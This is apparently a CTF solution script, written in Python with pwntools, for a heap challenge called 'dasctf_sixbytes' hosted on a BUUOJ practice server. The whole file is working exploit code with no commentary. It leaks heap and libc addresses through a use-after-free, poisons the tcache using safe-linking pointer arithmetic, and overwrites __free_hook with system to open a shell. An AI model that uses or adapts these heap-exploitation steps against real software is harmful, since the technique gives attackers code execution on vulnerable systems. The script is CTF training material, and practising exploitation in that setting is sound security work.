from pwn import *
from LibcSearcher import *

elf=ELF("./dasctf_sixbytes")
io=remote('node4.buuoj.cn',29062)
#p=process('./dasctf_sixbytes')
def add(size,Content):
    io.sendlineafter(': ','1')
    io.sendlineafter('size:',str(size))
    io.sendlineafter('Content: ',Content)
def edit(index,content):
    io.sendlineafter(': ','2')
    io.sendlineafter('index:',str(index))
    io.sendlineafter('content:',content)
def free(index):
    io.sendlineafter(': ','3')
    io.sendlineafter('index:',str(index))
def show(index):
    io.sendlineafter(': ','4')
    io.sendlineafter('index: \n',str(index))
def pack(pos,ptr):
    return(pos>>12)^ptr
for i in range(8):
    add(0x80,b'aaaa')
add(0x10,'aa')
for i in range(8):
    free(i)
show(0)
heap=u64(io.recv(5)[-5:].ljust(8,b'\x00'))
heap=heap << 12
print(hex(heap))
edit(7,'a')
show(7)
malloc_hook=u64(io.recv(6).ljust(8,b'\x00'))-193-0x10
print(hex(malloc_hook))
libc=LibcSearcher('__malloc_hook',malloc_hook)
libcbase=malloc_hook-libc.dump('__malloc_hook')
free_hook=libcbase+libc.dump('__free_hook')
system_addr=libcbase+libc.dump('system')
print(hex(system_addr))
print(hex(free_hook))
edit(6,p64(pack(heap+0x870,free_hook)))
add(0x80,'/bin/sh\x00')
add(0x80,p64(system_addr)+b'\x00')
io.interactive()